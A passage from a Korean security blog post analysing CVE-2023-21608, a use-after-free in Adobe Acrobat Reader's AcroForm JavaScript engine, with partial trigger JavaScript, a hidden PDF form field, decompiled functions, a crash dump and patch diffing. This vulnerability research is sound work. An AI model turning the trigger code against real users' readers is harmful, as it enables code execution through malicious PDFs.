class="hljs-title">calculateCallback</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span><span class="hljs-function"></span>{  event.__defineGetter__(<span class="hljs-string">&quot;target&quot;</span>, getterFunc);  event.richValue = <span class="hljs-built_in">this</span>;}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getterFunc</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span><span class="hljs-function"></span>{  <span class="hljs-keyword">try</span> { <span class="hljs-built_in">Object</span>.defineProperty(testField, <span class="hljs-string">&quot;textFont&quot;</span>, { <span class="hljs-attr">value</span>: <span class="hljs-built_in">this</span> }); } <span class="hljs-keyword">catch</span>(e) { }}</code></pre><p>&#xD574;&#xB2F9; &#xCF54;&#xB4DC;&#xAC00; &#xC0BD;&#xC785;&#xB41C; PDF &#xBB38;&#xC11C;&#xC5D0;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; <code>testField</code>&#xB77C;&#xB294; &#xC774;&#xB984;&#xC744; &#xAC00;&#xC9C0;&#xB294; text field&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;</p><pre><code class="hljs routeros">5 0 obj&lt;&lt;<span class="hljs-built_in">/Type </span>/Annot/Subtype /Widget/T (testField)/FT /Tx/Rect [0 0 0 0]&gt;&gt;</code></pre><p>&#xCF54;&#xB4DC;&#xAC00; &#xC0BD;&#xC785;&#xB41C; &#xBB38;&#xC11C;&#xB97C; &#xC5F4;&#xAC8C; &#xB418;&#xBA74; &#xC704;&#xC758; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA74;&#xC11C; (1)&#xBB38;&#xC11C; &#xC624;&#xBE0C;&#xC81D;&#xD2B8; <code>doc</code>&#xC758; Instance&#xC778; <code>this</code>&#xC758; <code>getField</code> &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; <code>testField</code> &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xAC00;&#xC838;&#xC624;&#xACE0; (2)<code>setAction</code> &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; <code>testField</code>&#xC758;  <code>Calculate</code> &#xD578;&#xB4E4;&#xB7EC;&#xB85C; <code>calculateCallback</code> &#xD568;&#xC218;&#xB97C; &#xC9C0;&#xC815;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xBC14;&#xB85C; &#xB2E4;&#xC74C; &#xC904;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; (3)<code>this.resetForm()</code>&#xC740; <code>Calculate</code> &#xD578;&#xB4E4;&#xB7EC;&#xAC00; &#xC815;&#xC758;&#xB41C; &#xBAA8;&#xB4E0; &#xD544;&#xB4DC; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xC5D0; <code>calculate</code> &#xC774;&#xBCA4;&#xD2B8;&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xCF1C; &#xD578;&#xB4E4;&#xB7EC;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xB3C4;&#xB85D; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. <code>testField</code>&#xC758; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; (4)<code>calculateCallback</code>&#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xACE0; &#xC774; &#xD568;&#xC218; &#xC548;&#xC5D0;&#xC11C; <code>event</code>&#xC758; <code>target</code> &#xC18D;&#xC131;&#xC5D0; &#xB300;&#xD55C; getter&#xB97C; <code>getterFunc</code>&#xB85C; &#xC7AC;&#xC815;&#xC758;&#xD558;&#xACE0; <code>richiValue</code> &#xC18D;&#xC131;&#xC5D0; <code>this</code>&#xB97C; &#xB300;&#xC785;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xC774;&#xB85C; &#xC778;&#xD574; <code>richValue</code>&#xC5D0; &#xB300;&#xC785;&#xB420; &#xAC12;&#xC778; <code>this</code> (<code>doc</code>)&#xC758; &#xBAA8;&#xB4E0; &#xC18D;&#xC131;&#xACFC; &#xBA54;&#xC18C;&#xB4DC;&#xAC00; <code>EScript!ESObjectEnum</code>&#xD568;&#xC218;&#xC5D0; &#xC758;&#xD574; &#xC7AC;&#xADC0;&#xC801;&#xC73C;&#xB85C; &#xC5F4;&#xAC70;&#xB418;&#xAE30; &#xC2DC;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <code>event.target</code>&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAC8C; &#xB418;&#xC5B4; <code>getterFunc</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xACE0; <code>testField.textFont</code>&#xAC00; <code>this</code>&#xB85C; &#xBC14;&#xB00C;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB450; &#xBC88;&#xC9F8; <code>this.resetForm()</code>&#xC5D0;&#xC11C;&#xB3C4; &#xC704;&#xC640; &#xAC19;&#xC740; &#xB3D9;&#xC791;&#xC774; &#xBC18;&#xBCF5;&#xB418;&#xC9C0;&#xB9CC; <code>this</code>&#xB85C; &#xBC14;&#xB010; <code>testField.textFont</code>&#xAC00; &#xC218;&#xC815; &#xBD88;&#xAC00;&#xB2A5;(non-configurable)&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>getterFunc</code>&#xC5D0;&#xC11C; &#xC608;&#xC678;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xBC1C;&#xC0DD;&#xD55C; &#xC608;&#xC678;&#xB85C; &#xC778;&#xD574; <code>event.richValue</code>&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xB54C; &#xD638;&#xCD9C;&#xB418;&#xB294; <code>AcroForm!GetRichValueEventProp</code>&#xC5D0;&#xC11C; &#xC544;&#xB798;&#xC758; &#xBD84;&#xAE30;&#xB85C; &#xC9C4;&#xC785;&#xD558;&#xC5EC; <code>CAggToESVal</code>&#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xBA74;&#xC11C; &#xC5F4;&#xAC70; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xD560;&#xB2F9;&#xB41C; <code>CAgg</code>&#xC640; <code>map</code> &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xBAA8;&#xB450; &#xD574;&#xC81C;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">GetRichValueEventProp</span><span class="hljs-params">(<span class="hljs-keyword">wchar_t</span> *arg0, <span class="hljs-keyword">int</span> a2, <span class="hljs-keyword">int</span> a3)</span></span><span class="hljs-function"></span>{...  <span class="hljs-keyword">else</span>  {    LOBYTE(v16) = <span class="hljs-number">0</span>;    sub_2085ECA0(<span class="hljs-string">&quot;EventRichValueInProgress&quot;</span>);    sub_20AAE7D6(arg0, v16, v17, v18, v19, <span class="hljs-number">0</span>, <span class="hljs-number">15</span>);    <span class="hljs-keyword">if</span> ( a1      &amp;&amp; (v9 = *(<span class="hljs-keyword">unsigned</span> __int16 (__fastcall **)(<span class="hljs-keyword">int</span>))(dword_21473CB8 + <span class="hljs-number">180</span>),          v10 = __guard_check_icall_fptr(a1),          v9(v10)) )    {      PointerType = sub_20A4AD65(a1, (<span class="hljs-keyword">wchar_t</span> *)<span class="hljs-string">&quot;richValue&quot;</span>, (<span class="hljs-keyword">wchar_t</span> *)<span class="hljs-string">&quot;CAgg_P&quot;</span>);      <span class="hljs-keyword">if</span> ( PointerType )        PointerType = CAggToESVal(PointerType, v12, (<span class="hljs-keyword">wchar_t</span> *)a3, PointerType);<span class="hljs-comment">// Free All CAgg &amp; map</span>    }...}</code></pre><p>&#xC5EC;&#xAE30;&#xAE4C;&#xC9C0;&#xB9CC; &#xBCF4;&#xBA74; &#xB531;&#xD788; &#xD070; &#xBB38;&#xC81C;&#xB294; &#xC5C6;&#xC5B4; &#xBCF4;&#xC774;&#xC9C0;&#xB9CC; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB4E4;&#xC758; &#xD574;&#xC81C;&#xAC00; &#xC5F4;&#xAC70;&#xAC00; &#xC544;&#xC9C1; &#xB05D;&#xB098;&#xC9C0; &#xC54A;&#xC740; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774;&#xD6C4; &#xD574;&#xC81C;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xBA74;&#xC11C; Use-After-Free&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;!!!</p><pre><code class="hljs routeros"><span class="hljs-attribute">eax</span>=04f6a0f0 <span class="hljs-attribute">ebx</span>=00000000 <span class="hljs-attribute">ecx</span>=420fefd0 <span class="hljs-attribute">edx</span>=44e1cff8 <span class="hljs-attribute">esi</span>=6921ef50 <span class="hljs-attribute">edi</span>=420fefd0<span class="hljs-attribute">eip</span>=6c556b99 <span class="hljs-attribute">esp</span>=04f6a0d0 <span class="hljs-attribute">ebp</span>=04f6a0fc <span class="hljs-attribute">iopl</span>=0         nv up ei pl nz na pe nc<span class="hljs-attribute">cs</span>=0023  <span class="hljs-attribute">ss</span>=002b  <span class="hljs-attribute">ds</span>=002b  <span class="hljs-attribute">es</span>=002b  <span class="hljs-attribute">fs</span>=0053  <span class="hljs-attribute">gs</span>=002b             <span class="hljs-attribute">efl</span>=00010206AcroForm!CAgg::operator[](unsigned short)+0xe:6c556b99 8b07            mov     eax,dword ptr [edi]  ds:002b:<span class="hljs-attribute">420fefd0</span>=????????</code></pre><p>page-heap&#xC744; &#xD65C;&#xC131;&#xD654;&#xD558;&#xACE0; &#xBC84;&#xADF8;&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD574;&#xBCF4;&#xBA74; Use-After-Free&#xB85C; &#xC778;&#xD574; <code>AcroForm!CAgg::operator[]</code> &#xC5D0;&#xC11C; &#xC704;&#xC640; &#xAC19;&#xC740; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xB798;&#xC758; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xB41C; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; &#xBCF4;&#xBA74; if&#xBB38; &#xC548;&#xC5D0;&#xC11C; <code>this-&gt;type</code> &#xC5D0; &#xC811;&#xADFC;&#xD560; &#xB54C; &#xBC1C;&#xC0DD;&#xD588;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xACE0; &#xB530;&#xB77C;&#xC11C; <code>this</code>&#xAC00; UAF&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xACE0; &#xC788;&#xB2E4;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">int</span> __userpurge CAgg::<span class="hljs-keyword">operator</span>[]@&lt;eax&gt;(CAgg *<span class="hljs-keyword">this</span>@&lt;ecx&gt;, <span class="hljs-keyword">bool</span> (*a2)[<span class="hljs-number">27</span>]@&lt;ebx&gt;, <span class="hljs-keyword">wchar_t</span> *someID){  ...  <span class="hljs-keyword">if</span> ( <span class="hljs-keyword">this</span>-&gt;type == <span class="hljs-number">0x13</span> )  {    ...  }  <span class="hljs-keyword">else</span>  {    ...    <span class="hljs-keyword">else</span>    {      CAgg::convert(<span class="hljs-keyword">this</span>, a2, <span class="hljs-number">0x14</span>);      v4 = (_DWORD *)<span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>,CAgg&gt;::<span class="hljs-keyword">operator</span>[](<span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">map</span>, (<span class="hljs-keyword">int</span>)v9, (<span class="hljs-keyword">unsigned</span> __int16 *)&amp;someID);    }    <span class="hljs-keyword">return</span> *v4 + <span class="hljs-number">24</span>;  }}</code></pre><p>&#xD574;&#xB2F9; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD55C; &#xD568;&#xC218;&#xB294; &#xC544;&#xB798;&#xC758; <code>AcroForm!EScript_ESObjectEnum_CallbackProc</code>&#xD568;&#xC218;&#xB85C; <code>CAgg:operator[]</code>&#xC758; &#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790;(<code>this</code>)&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xB294; <code>pCagg</code>&#xAC00; &#xD574;&#xC81C;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xBA70; &#xC774;&#xB294; <code>pCAggData</code>&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xC77D;&#xC5B4;&#xC628; &#xC8FC;&#xC18C;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">int</span> __usercall EScript_ESObjectEnum_CallbackProc@&lt;eax&gt;(        <span class="hljs-keyword">bool</span> (*ebx0)[<span class="hljs-number">27</span>]@&lt;ebx&gt;,        <span class="hljs-keyword">int</span> a2,        <span class="hljs-keyword">wchar_t</span> *key_str,        <span class="hljs-keyword">wchar_t</span> *a4,        <span class="hljs-keyword">int</span> ***pCAggData){  CAgg **pCagg; <span class="hljs-comment">// edi</span>  <span class="hljs-keyword">unsigned</span> __int16 someID; <span class="hljs-comment">// ax</span>  CAgg *v7; <span class="hljs-comment">// eax</span>  pCagg = (CAgg **)*pCAggData;  someID = (*(<span class="hljs-keyword">int</span> (__cdecl **)(<span class="hljs-keyword">wchar_t</span> *))(gCoreHFT + <span class="hljs-number">20</span>))(key_str);   v7 = (CAgg *)CAgg::<span class="hljs-keyword">operator</span>[]((CAgg *)pCagg, ebx0, (<span class="hljs-keyword">wchar_t</span> *)someID);  ESValToCAgg(v7, a4, <span class="hljs-number">0</span>);  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;}</code></pre><h1 id="3-&#xD328;&#xCE58;-&#xBD84;&#xC11D;"><a href="#3-&#xD328;&#xCE58;-&#xBD84;&#xC11D;" class="headerlink" title="3.  &#xD328;&#xCE58; &#xBD84;&#xC11D;"></a>3.  &#xD328;&#xCE58; &#xBD84;&#xC11D;</h1><hr><p>&#xBC84;&#xADF8;&#xAC00; Acrobat&#xC758; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xC5D4;&#xC9C4;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774;&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xB54C;&#xB3C4; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xAC00; &#xC0AC;&#xC6A9;&#xB418;&#xACE0; &#xB4A4;&#xC5D0;&#xC11C; &#xB2E4;&#xB8F0; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0;&#xC11C;&#xB3C4; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xC785;&#xB2C8;&#xB2E4;&#x2026; &#xD3C9;&#xC18C;&#xC5D0; &#xBCF4;&#xB358; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xACFC;&#xB294; &#xACB0;&#xC774; &#xB2E4;&#xB974;&#xB2E4;&#xB294;&#xAC8C; &#xB290;&#xAEF4;&#xC9C0;&#xB124;&#xC694; &#x1F972;</p><p>&#xBC14;&#xB85C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xACFC;&#xC815;&#xC744; &#xC54C;&#xC544;&#xBCF4;&#xAE30; &#xC804;&#xC5D0; &#xBA3C;&#xC800; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;! &#xAC04;&#xB2E8;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC544;&#xB2CC; &#xB9CC;&#xD07C; &#xD328;&#xCE58; &#xB610;&#xD55C; &#xCF54;&#xB4DC; &#xD55C; &#xB450;&#xC904;&#xC5D0;&#xC11C; &#xB05D;&#xB0A0;&#xB9AC; &#xC5C6;&#xACA0;&#xC8E0;? </p><p>&#xBA3C;&#xC800; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD328;&#xCE58;&#xB41C; &#xBC84;&#xC804;(Adobe Acrobat Reader DC 2022.003.20310)&#xACFC; &#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;(Adobe Acrobat Reader DC 2022.001.20085)&#xC758; <code>AcroForm.api</code>&#xB97C; Diffing&#xD558;&#xC5EC; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xACB0;&#xACFC;&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><img src="/2024/08/04/pwndorei/1day1document_CVE-2023-21608/Untitled.png" alt="Untitled"></p><p>primary&#xC640; secondary&#xB294; &#xAC01;&#xAC01; &#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xACFC; &#xD328;&#xCE58;&#xB41C; &#xBC84;&#xC804;&#xC758; <code>AcroForm.api</code> &#xC774;&#xACE0; &#xB458; &#xC0AC;&#xC774;&#xC5D0; match&#xB41C; &#xD568;&#xC218;&#xB4E4; &#xC911;&#xC5D0;&#xC11C; &#xBC84;&#xADF8;&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xD568;&#xC218;&#xB4E4;&#xC758; &#xBCC0;&#xACBD;&#xC810;&#xC744; &#xC0B4;&#xD3B4;&#xBCF8; &#xACB0;&#xACFC; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>SetRichValueEventProp</code>&#xACFC; <code>GetRichValueEventProp</code>, <code>SetRichChangeEventProp</code>&#xACFC; <code>GetRichChangeEventProp</code>&#xC5D0;&#xC11C; &#xCC28;&#xC774;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/08/04/pwndorei/1day1document_CVE-2023-21608/Untitled%201.png" alt="Untitled"></p><p>&#xC774;&#xC911;&#xC5D0;&#xC11C;&#xB3C4; <code>GetRichValueEventProp</code>&#xC758; &#xCC28;&#xC774;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740;&#xB370;&#xC694;?</p><p><img src="/2024/08/04/pwndorei/1day1document_CVE-2023-21608/Untitled%202.png" alt="Untitled"></p><p>&#xB178;&#xB780;&#xC0C9;&#xC73C;&#xB85C; &#xD45C;&#xC2DC;&#xB41C; Basic Block&#xC740; &#xD328;&#xCE58; &#xC804;&#xD6C4;&#xB85C; &#xCC28;&#xC774;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0;&#xB9CC; Match&#xB418;&#xB294; Basic Block&#xC73C;&#xB85C; &#xC67C;&#xCABD;&#xC774; primary(&#xD328;&#xCE58; &#xC804;), &#xC624;&#xB978;&#xCABD;&#xC774; secondary(&#xD328;&#xCE58; &#xD6C4;)&#xC774;&#xBA70; &#xD30C;&#xB780;&#xC0C9;&#xC758; &#xCF54;&#xB4DC;&#xC640; Basic Block&#xC740; primary&#xC5D0;&#xB294; &#xC5C6;&#xC9C0;&#xB9CC; secondary&#xC5D0;&#xB294; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC744; &#xB098;&#xD0C0;&#xB0C5;&#xB2C8;&#xB2E4;. &#xC989; &#xD328;&#xCE58;&#xB85C; &#xCD94;&#xAC00;&#xB41C; &#xD30C;&#xB780;&#xC0C9; &#xBD80;&#xBD84;&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD574;&#xACB0;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB77C;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xB294;&#xAC70;&#xC8E0;.</p><p>&#xC774;&#xB97C; &#xD1B5;&#xD574; <code>GetRichValueEventProp</code>&#xC5D0;&#xB294; &#xD06C;&#xAC8C; &#xC544;&#xB798;&#xC758; &#xB450; &#xAC00;&#xC9C0; &#xBCC0;&#xACBD;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xBC84;&#xADF8;&#xAC00; &#xD2B8;&#xB9AC;&#xAC70;&#xB418;&#xB294; <code>CAggToESVal</code> &#xD568;&#xC218; &#xD638;&#xCD9C; &#xC804;, <code>IsDataInGlobalHashTable</code> &#xD568;&#xC218;&#xC758; &#xD638;&#xCD9C;&#xC774; &#xC120;&#xD589;&#xB418;&#xACE0; &#xC774; &#xD568;&#xC218;&#xC758; &#xBC18;&#xD658; &#xAC12;&#xC774; <code>CAggToESVal</code>&#xC774; &#xD638;&#xCD9C;&#xB418;&#xB294; Basic Block&#xC73C;&#xB85C;&#xC758; &#xBD84;&#xAE30; &#xC5EC;&#xBD80;&#xB97C; &#xACB0;&#xC815;</li><li><code>CAggToESVal</code>&#xC774; &#xD638;&#xCD9C;&#xB418;&#xB294; Basic Block&#xC5D0;&#xC11C;&#xB294; &#xD568;&#xC218; &#xD638;&#xCD9C; &#xC804;&#xD6C4;&#xB85C; &#xAC01;&#xAC01; <code>InsertToGlobalHashTable</code>&#xACFC; <code>DeleteFromGlobalHashTable</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;</li></ol><p>&#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xB41C; &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;!</p><pre><code class="hljs c">  PointerType = sub_20A4BC05(v31, (<span class="hljs-keyword">wchar_t</span> *)<span class="hljs-string">&quot;richValue&quot;</span>);  PointerType_1 = PointerType;  <span class="hljs-keyword">if</span> ( PointerType )  {    LOBYTE(PointerType) = IsDataInGlobalHashTable(PointerType);    <span class="hljs-keyword">if</span> ( !(_BYTE)PointerType )    {      v15 = InsertToGlobalHashTable((<span class="hljs-keyword">int</span>)&amp;v31, PointerType_1);      LOBYTE(v33) = <span class="hljs-number">4</span>;      CAggToESVal((<span class="hljs-keyword">int</span>)v15, v16, PropName, PointerType_1);      PointerType = DeleteFromGlobalHashTable((<span class="hljs-keyword">int</span>)&amp;v31);    }  }}</code></pre><p><code>AcroForm.api</code>&#xC740; &#xC2EC;&#xBCFC;&#xC774; &#xC5C6;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD568;&#xC218;&#xB4E4;&#xC744; &#xC815;&#xC131;&#xC2A4;&#xB7FD;&#xAC8C; &#xBD84;&#xC11D;&#xD574;&#xBCF8; &#xACB0;&#xACFC; &#xD574;&#xC2DC; &#xD14C;&#xC774;&#xBE14;&#xACFC; &#xAD00;&#xB828;&#xB41C; &#xD568;&#xC218;&#xB4E4;&#xC774;&#xB77C;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC5C8;&#xACE0; <code>InsertToGlobalHashTable</code>&#xC640; <code>DeleteFromGlobalHashTable</code> &#xD568;&#xC218; &#xB4F1; &#xAC01;&#xAC01;&#xC758; &#xD568;&#xC218;&#xC758; &#xAE30;&#xB2A5;&#xC5D0; &#xB530;&#xB77C; &#xC774;&#xB984;&#xC744; &#xBD99;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCD94;&#xAC00;&#xB41C; &#xD568;&#xC218;&#xB4E4;&#xC758; &#xB3D9;&#xC791;&#xC744; &#xBD84;&#xC11D;&#xD55C; &#xACB0;&#xACFC; &#xC5F4;&#xAC70; &#xB3C4;&#xC911;&#xC5D0; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB4E4;&#xC774; free&#xB418;&#xB294; &#xBC84;&#xADF8;&#xC758; &#xBC1C;&#xC0DD;&#xC744; &#xB9C9;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC5C8;&#xACE0; &#xAC01;&#xAC01;&#xC758; &#xD568;&#xC218;&#xB97C; &#xBD84;&#xC11D;&#xD55C; &#xB0B4;&#xC6A9;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="IsDataInGlobalHashTable"><a href="#IsDataInGlobalHashTable" class="headerlink" title="IsDataInGlobalHashTable"></a>IsDataInGlobalHashTable</h2><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">bool</span> __cdecl <span class="hljs-title">IsDataInGlobalHashTable</span><span class="hljs-params">(<span class="hljs-keyword">int</span> Data)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// ecx</span>  <span class="hljs-keyword">int</span> a2; <span class="hljs-comment">// [esp+0h] [ebp-4h] BYREF</span>  a2 = v1;  <span class="hljs-keyword">return</span> Data &amp;&amp; sub_20AD638B(&amp;GlobalHashTable, (ListEntry *)&amp;a2, (<span class="hljs-keyword">int</span>)&amp;Data)-&gt;Flink != GlobalHashTable.DefaultHead;}</code></pre><p>&#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xB41C; &#xCF54;&#xB4DC;&#xB294; &#xC704;&#xC640; &#xAC19;&#xC73C;&#xBA70; <code>sub_20AD638B</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; <code>GlobalHashTable</code>&#xC5D0; <code>Data</code>&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>GlobalHashTable</code>&#xC740; &#xC790;&#xB8CC;&#xD615;&#xC774; &#xC544;&#xB798;&#xC758; <code>HashTable</code> &#xAD6C;&#xC870;&#xCCB4;&#xC778; &#xC804;&#xC5ED; &#xBCC0;&#xC218;&#xB85C; &#xC5F0;&#xAD00;&#xB41C; &#xBAA8;&#xB4E0; &#xAD6C;&#xC870;&#xCCB4;&#xB4E4;&#xC758; &#xBA85;&#xCE6D;&#xACFC; &#xC815;&#xC758;&#xB294; &#xBD84;&#xC11D;&#xC744; &#xD1B5;&#xD574; &#xC720;&#xCD94;&#xD55C; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><h3 id="HashTable"><a href="#HashTable" class="headerlink" title="HashTable"></a>HashTable</h3><pre><code class="hljs basic"><span class="hljs-symbol">00000000 </span>ListEntry       struc ; (sizeof=<span class="hljs-number">0</span>x8, mappedto_221)<span class="hljs-symbol">00000000 </span>                                        <span class="hljs-symbol">00000000 </span>                                        <span class="hljs-symbol">00000000 </span>Flink           dd ?                    <span class="hljs-symbol">00000004 </span>Blink           dd ?                    <span class="hljs-symbol">00000008 </span>ListEntry       ends<span class="hljs-number">00000008</span><span class="hljs-symbol">00000000 </span>; ---------------------------------------------------------------------------<span class="hljs-number">00000000</span><span class="hljs-symbol">00000000 </span>HashBucketEntry struc ; (sizeof=<span class="hljs-number">0</span>x10, mappedto_223)<span class="hljs-symbol">00000000 </span>                                        <span class="hljs-symbol">00000000 </span>list_entry      union1 ?                <span class="hljs-symbol">00000000 </span>                                        <span class="hljs-symbol">00000008 </span><span class="hljs-keyword">Data</span>            dd ?                    <span class="hljs-symbol">00000008 </span>                                        <span class="hljs-number">0000000</span>C field_C         dd ?                    <span class="hljs-symbol">00000010 </span>HashBucketEntry ends<span class="hljs-number">00000010</span><span class="hljs-symbol">00000000 </span>; ---------------------------------------------------------------------------<span class="hljs-number">00000000</span><span class="hljs-symbol">00000000 </span>HashTable       struc ; (sizeof=<span class="hljs-number">0</span>x30, mappedto_224)<span class="hljs-symbol">00000000 </span>                                        <span class="hljs-symbol">00000000 </span>unknown0        dd ?<span class="hljs-symbol">00000004 </span>DefaultHead     dd ?                    <span class="hljs-symbol">00000004 </span>                                        <span class="hljs-symbol">00000008 </span>length          dd ?<span class="hljs-number">0000000</span>C HashBuckets     HashBucketTable ?       <span class="hljs-symbol">00000020 </span>field_20        dd ?                    <span class="hljs-symbol">00000020 </span>                                        <span class="hljs-symbol">00000024 